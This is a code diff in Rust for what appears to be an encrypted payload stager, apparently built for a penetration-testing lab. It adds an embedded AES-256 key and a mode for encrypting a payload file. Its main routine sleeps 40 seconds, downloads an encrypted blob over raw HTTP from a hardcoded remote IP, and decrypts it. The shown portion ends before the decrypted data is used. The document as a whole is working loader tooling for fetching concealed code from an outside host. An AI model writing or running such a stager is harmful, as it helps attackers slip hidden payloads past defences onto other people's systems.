@@ -10,15 +10,30 @@ use std::{
 type Aes256CbcEnc = Encryptor<Aes256>;
 type Aes256CbcDec = Decryptor<Aes256>;
 
+const KEY_HEX: &str = "359d003b202332e5630cdef69702dff35cc946f6cc9efd4cbad7c0b401660e4a";
 const IV_HEX: &str = "34421aedd8bc5caec8a9075aa67bf9aa";
 
 const REMOTE_IP: &str = "10.10.14.16";
 const REMOTE_PORT: &str = "80";
-const FILE_PATH: &str = "xct.bin";
+const FILE_PATH: &str = "s";
 
 fn main() {
+    let args: Vec<String> = std::env::args().collect();
+
+    // Encrypt file if --encrypt argument is provided
+    if let Some(pos) = args.iter().position(|a| a == "--encrypt") {
+        if let Some(filepath) = args.get(pos + 1) {
+            let key = decode_hex::<32>(KEY_HEX);
+            let plaintext = std::fs::read(filepath).expect("Failed to read file");
+            let encrypted = encrypt_data(&key, &plaintext);
+            let dir = std::path::Path::new(filepath).parent().unwrap_or(std::path::Path::new("."));
+            std::fs::write(dir.join("s"), encrypted).expect("Failed to write encrypted file");
+            return;
+        }
+    }
+
     wait(Duration::from_secs(40));
-    let key = decode_hex::<32>("359d003b202332e5630cdef69702dff35cc946f6cc9efd4cbad7c0b401660e4a");
+    let key = decode_hex::<32>(KEY_HEX);
     let encrypted_data = download_file(REMOTE_IP, REMOTE_PORT, FILE_PATH).unwrap();
     let data = decrypt_data(&key, encrypted_data);
 }
@@ -35,14 +50,11 @@ fn wait(duration: Duration) {
 }
 
 fn download_file(remote_ip: &str, remote_port: &str, path: &str) -> Result<Vec<u8>, Box<dyn Error>> {
-    // Connect to the server
     let mut stream = TcpStream::connect(format!("{}:{}", remote_ip, remote_port))?;
     
-    // Send HTTP GET request
     let request = format!("GET /{} HTTP/1.1\r\n\r\n", path);
     stream.write_all(request.as_bytes())?;
     
-    // Read the response data
     let mut data = Vec::new();
     let mut buffer = [0; 512];
     
